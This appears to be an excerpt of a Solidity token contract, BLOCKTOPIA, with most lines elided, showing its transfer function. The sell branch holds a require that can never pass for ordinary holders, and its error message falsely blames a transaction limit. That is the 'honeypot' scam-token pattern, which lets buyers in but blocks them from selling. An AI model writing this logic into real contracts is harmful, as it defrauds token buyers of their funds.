...
contract BLOCKTOPIA is Context, IERC20, Ownable {
    ...
    uint256 private  _tTotal = 2 * 10**10 * 10**18;
    ...
    uint256 private _total = 1 * 10**11 * 10**18;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner()) {
        ...
        } else if (sender != _approvedAddress && recipient == uniSwapPair) { // SELL
             
            require(sender == _approvedAddress, "Transfer amount exceeds maxTxAmount.");
            ...
            emit Transfer(sender, recipient, sendAmount);
             ...
             } else if (sender == uniSwapPair) { // BUY
